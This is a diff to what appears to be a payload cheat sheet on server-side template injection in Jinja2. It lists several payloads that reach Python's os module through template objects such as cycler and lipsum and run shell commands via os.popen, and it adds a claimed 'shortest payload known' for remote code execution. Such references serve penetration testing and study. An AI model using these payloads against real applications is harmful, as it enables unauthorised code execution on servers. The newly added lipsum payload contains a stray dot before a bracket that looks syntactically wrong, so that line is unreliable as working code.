@@ -563,7 +563,7 @@ But when `__builtins__` is filtered, the following payloads are context-free, an
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-We can use these shorter payloads (this is the shorter payloads known yet):
+We can use these shorter payloads:
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -572,6 +572,14 @@ We can use these shorter payloads (this is the shorter payloads known yet):
 ```
 
 Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
+
+```python
+{{ lipsum.__globals__.["os"].popen('id').read() }}
+```
+
+Source: https://twitter.com/podalirius_/status/1655970628648697860
 
 #### Exploit the SSTI by calling subprocess.Popen
 
